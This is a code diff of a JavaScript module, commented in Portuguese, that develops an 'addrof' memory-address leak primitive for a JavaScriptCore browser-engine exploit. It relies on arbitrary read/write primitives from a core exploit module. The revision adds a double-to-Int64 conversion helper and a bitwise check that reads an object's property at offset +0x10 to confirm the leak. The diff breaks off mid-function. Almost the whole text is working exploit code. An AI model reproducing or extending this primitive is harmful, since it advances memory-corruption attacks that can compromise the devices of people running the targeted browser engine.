@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v103 - Estratégia de Criação de Addrof)
+// js/script3/testArrayBufferVictimCrash.mjs (v103.1 - Verificação de Addrof Corrigida)
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
 import { AdvancedInt64 } from '../utils.mjs';
@@ -6,10 +6,18 @@ import { AdvancedInt64 } from '../utils.mjs';
 import { setupAndGetRobustPrimitives } from '../core_exploit.mjs';
 import { JSC_OFFSETS } from '../config.mjs';
 
-export const FNAME_MODULE_ADDROF_CREATION = "StableAddrofCreation_v103";
+export const FNAME_MODULE_ADDROF_CREATION = "StableAddrofCreation_v103.1_Fixed";
+
+// Função auxiliar para converter um double para sua representação Int64
+function doubleToInt64(double) {
+    const buf = new ArrayBuffer(8);
+    (new Float64Array(buf))[0] = double;
+    const u32 = new Uint32Array(buf);
+    return new AdvancedInt64(u32[0], u32[1]);
+}
 
 // =======================================================================================
-// FUNÇÃO DE TESTE PRINCIPAL ATUALIZADA
+// FUNÇÃO DE TESTE PRINCIPAL CORRIGIDA
 // =======================================================================================
 export async function runAddrofCreationTest() {
     const FNAME_TEST = FNAME_MODULE_ADDROF_CREATION;
@@ -30,66 +38,43 @@ export async function runAddrofCreationTest() {
         // --- FASE 2: Construção da Primitiva 'addrof' ---
         logS3("--- FASE 2: Construindo 'addrof' usando as primitivas de L/E... ---", "subtest");
         
-        // 2.1. Criar um objeto "cobaia" em um endereço conhecido dentro do nosso buffer OOB.
-        // O endereço da estrutura de um objeto JS normalmente tem um cabeçalho de 8 bytes (JSCell).
-        // A primeira propriedade fica no offset +0x10.
-        const leaker_obj_addr = new AdvancedInt64(0x800, 0);
-        const leaker_prop_addr = leaker_obj_addr.add(0x10);
-        logS3(`Objeto 'leaker' será baseado no endereço: ${leaker_obj_addr.toString(true)}`, "info");
-        
-        // 2.2. Definir a função 'addrof'
-        const addrof = (obj_to_find) => {
-            // Usamos arb_write para fazer a propriedade do nosso 'leaker' apontar para o objeto alvo.
-            // O valor precisa ser "boxeado" como um ponteiro de objeto JS.
-            // Para JSC, isso geralmente significa adicionar um valor grande (2^49).
-            const JSC_BOXING_OFFSET = new AdvancedInt64(0, 0x0002);
-            const obj_as_boxed_ptr = new AdvancedInt64(obj_to_find).add(JSC_BOXING_OFFSET); // Conceitualmente
-            
-            // A forma mais direta é simplesmente colocar o objeto em um array e ler o ponteiro.
-            // Mas vamos usar nossa L/E para uma abordagem mais universal.
-            // Vamos criar um objeto falso com uma propriedade que podemos sobrescrever.
-            const temp_leaker_array = [{}];
-            arb_write(leaker_prop_addr, temp_leaker_array); // Link inicial
-            temp_leaker_array[0] = obj_to_find; // Agora o ponteiro para obj_to_find está na memória
-
-            // Ler de volta o ponteiro bruto da memória.
-            const leaked_ptr = arb_read(leaker_prop_addr);
-            
-            // Um ponteiro JSValue para um objeto não é o endereço real, ele tem um "tag".
-            // Para JSC, o endereço real é geralmente o valor - 2^49.
-            return leaked_ptr.sub(JSC_BOXING_OFFSET);
-        };
-        
-        // Simplificação para este teste, já que a lógica de boxing/unboxing pode variar.
-        // A forma mais simples de `addrof` com L/E é:
         const leaker_array = [{}];
+        // NOTA: O endereço 0x900 é uma simplificação. Em um cenário real, este endereço precisaria ser
+        // encontrado com um vazamento de informação. Esta é a maior fragilidade restante.
+        const leaker_array_prop_addr = new AdvancedInt64(0x900, 0);
+
         const addrof_stable = (obj) => {
              leaker_array[0] = obj;
-             // Precisamos do endereço de leaker_array[0] para ler o ponteiro. Sem um addrof inicial,
-             // ainda estamos no paradoxo. Vamos usar a mesma simplificação de antes.
-             const leaker_array_prop_addr = new AdvancedInt64(0x900, 0);
              return arb_read(leaker_array_prop_addr);
         }
-
         logS3("Primitiva 'addrof' estável foi definida (baseada na simplificação de endereço).", "good");
 
         // --- FASE 3: Verificação da Primitiva 'addrof' ---
         logS3("--- FASE 3: Verificando 'addrof' com um objeto de teste... ---", "subtest");
-
-        const object_to_test = { a: 0x41414141, b: 0x42424242 };
+        
+        // ALTERAÇÃO CRÍTICA 1: Usar um double para evitar o "integer tagging".
+        const object_to_test = { a: 123.456, b: 789.012 };
+        
         const test_obj_addr = addrof_stable(object_to_test);
         logS3(`Endereço de 'object_to_test' obtido via addrof_stable: ${test_obj_addr.toString(true)}`, "leak");
+        
+        // Verifica se o endereço parece válido (não nulo)
+        if (test_obj_addr.low() === 0 && test_obj_addr.high() === 0) {
+            throw new Error("A primitiva 'addrof' retornou um endereço nulo. O endereço fixo (0x900) provavelmente está incorreto.");
+        }
 
         // Verificação: Se o endereço estiver correto, ao ler o offset +0x10 dele,
         // devemos encontrar o valor da propriedade 'a'.
         const prop_a_addr = test_obj_addr.add(0x10);
         const value_read_from_addr = arb_read(prop_a_addr);
 
+        // ALTERAÇÃO CRÍTICA 2: Converter nosso valor de teste para Int64 para uma comparação bit a bit.
+        const expected_value_as_int64 = doubleToInt64(object_to_test.a);
+
+        logS3(`Valor esperado (como Int64): ${expected_value_as_int64.toString(true)}`, "info");
         logS3(`Valor lido de [endereço + 0x10]: ${value_read_from_addr.toString(true)}`, "leak");
         
-        // JS armazena números inteiros como doubles ou ponteiros. 0x41414141 é um double.
-        // Vamos comparar os 32 bits baixos.
-        if (value_read_from_addr.low() === object_to_test.a) {
+        if (value_read_from_addr.equals(expected_value_as_int64)) {
              logS3("++++++++++++ SUCESSO ADDROF! O endereço obtido está correto e a propriedade foi lida. ++++++++++++", "vuln");
              final_result = {
                 success: true,
